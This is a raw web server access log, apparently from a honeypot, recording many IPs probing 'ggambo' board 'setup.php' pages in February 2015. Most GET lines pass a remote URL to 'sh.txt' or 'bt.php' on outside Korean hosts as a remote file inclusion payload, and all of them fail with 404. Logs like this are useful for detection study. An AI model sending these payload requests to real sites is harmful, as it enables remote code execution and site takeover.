181.65.186.35 - - [10/Feb/2015:11:34:01 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
1.224.163.80 - - [10/Feb/2015:11:34:02 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
181.65.186.35 - - [10/Feb/2015:11:34:03 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
1.224.163.80 - - [10/Feb/2015:11:34:03 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
181.65.186.35 - - [10/Feb/2015:11:34:03 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
1.224.163.80 - - [10/Feb/2015:11:34:03 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:11:34:04 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:11:34:04 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:11:34:04 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:11:34:05 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
181.65.186.35 - - [10/Feb/2015:11:34:06 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
1.224.163.80 - - [10/Feb/2015:11:34:06 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:11:34:08 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:11:34:09 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:11:34:10 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:11:34:11 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
181.65.186.35 - - [10/Feb/2015:11:34:28 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
203.58.0.155 - - [10/Feb/2015:11:34:34 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
181.65.186.35 - - [10/Feb/2015:11:34:34 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
203.58.0.155 - - [10/Feb/2015:11:34:35 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
181.65.186.35 - - [10/Feb/2015:11:34:35 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
203.58.0.155 - - [10/Feb/2015:11:34:36 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
203.58.0.155 - - [10/Feb/2015:11:34:37 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
203.58.0.155 - - [10/Feb/2015:11:34:38 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
203.58.0.155 - - [10/Feb/2015:11:34:39 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
181.65.186.35 - - [10/Feb/2015:11:34:40 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
203.58.0.155 - - [10/Feb/2015:11:34:40 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
203.58.0.155 - - [10/Feb/2015:11:34:41 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
1.224.163.80 - - [10/Feb/2015:11:34:59 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [10/Feb/2015:11:35:01 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [10/Feb/2015:11:35:01 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [10/Feb/2015:11:35:03 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [10/Feb/2015:11:35:06 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [10/Feb/2015:11:35:08 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [10/Feb/2015:11:35:14 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [10/Feb/2015:11:35:19 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
211.47.181.38 - - [10/Feb/2015:11:36:12 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
211.47.181.38 - - [10/Feb/2015:11:36:14 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
211.47.181.38 - - [10/Feb/2015:11:36:14 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
211.47.181.38 - - [10/Feb/2015:11:36:16 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
146.0.40.55 - - [10/Feb/2015:11:37:19 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
146.0.40.55 - - [10/Feb/2015:11:37:25 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
146.0.40.55 - - [10/Feb/2015:11:37:30 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
146.0.40.55 - - [10/Feb/2015:11:37:36 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
74.208.180.111 - - [10/Feb/2015:11:38:21 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:11:38:22 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:11:38:22 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:11:38:23 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
112.218.68.155 - - [10/Feb/2015:11:39:00 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [10/Feb/2015:11:39:01 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [10/Feb/2015:11:39:02 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [10/Feb/2015:11:39:03 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
1.224.163.80 - - [10/Feb/2015:11:39:34 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:11:39:35 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:11:39:36 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:11:39:37 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
112.218.68.155 - - [10/Feb/2015:11:39:46 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
203.58.0.155 - - [10/Feb/2015:11:39:47 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
112.218.68.155 - - [10/Feb/2015:11:39:48 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
203.58.0.155 - - [10/Feb/2015:11:39:48 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
112.218.68.155 - - [10/Feb/2015:11:39:48 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
203.58.0.155 - - [10/Feb/2015:11:39:49 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
112.218.68.155 - - [10/Feb/2015:11:39:50 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
203.58.0.155 - - [10/Feb/2015:11:39:50 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
112.218.68.155 - - [10/Feb/2015:11:39:55 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [10/Feb/2015:11:39:56 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [10/Feb/2015:11:39:57 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [10/Feb/2015:11:39:57 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [10/Feb/2015:11:39:59 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [10/Feb/2015:11:39:59 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [10/Feb/2015:11:39:59 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [10/Feb/2015:11:40:01 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
178.33.226.103 - - [10/Feb/2015:11:40:05 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
178.33.226.103 - - [10/Feb/2015:11:40:06 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
178.33.226.103 - - [10/Feb/2015:11:40:06 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
178.33.226.103 - - [10/Feb/2015:11:40:08 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
112.218.68.155 - - [10/Feb/2015:11:40:12 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [10/Feb/2015:11:40:13 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [10/Feb/2015:11:40:14 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [10/Feb/2015:11:40:15 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
49.50.76.8 - - [10/Feb/2015:11:40:34 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
49.50.76.8 - - [10/Feb/2015:11:40:36 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
49.50.76.8 - - [10/Feb/2015:11:40:37 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
49.50.76.8 - - [10/Feb/2015:11:40:38 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
112.218.68.155 - - [10/Feb/2015:11:40:41 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [10/Feb/2015:11:40:42 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [10/Feb/2015:11:40:43 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [10/Feb/2015:11:40:45 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
1.224.163.80 - - [10/Feb/2015:11:41:06 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [10/Feb/2015:11:41:07 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [10/Feb/2015:11:41:08 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [10/Feb/2015:11:41:09 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [10/Feb/2015:11:41:10 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
1.224.163.80 - - [10/Feb/2015:11:41:11 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
1.224.163.80 - - [10/Feb/2015:11:41:21 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
1.224.163.80 - - [10/Feb/2015:11:41:22 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.111 - - [10/Feb/2015:11:45:53 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:11:45:55 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:11:45:55 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:11:45:56 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
181.65.186.35 - - [10/Feb/2015:11:46:40 -0800] "GET /honeypot////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:46:41 -0800] "GET /honeypot////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:46:42 -0800] "POST /honeypot////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:46:54 -0800] "POST /honeypot////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:46:54 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:46:55 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:46:56 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:47:00 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
91.121.6.123 - - [10/Feb/2015:11:47:52 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.glory-korea.com/bbs/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
91.121.6.123 - - [10/Feb/2015:11:47:54 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.glory-korea.com/bbs/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
91.121.6.123 - - [10/Feb/2015:11:47:54 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
91.121.6.123 - - [10/Feb/2015:11:47:55 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
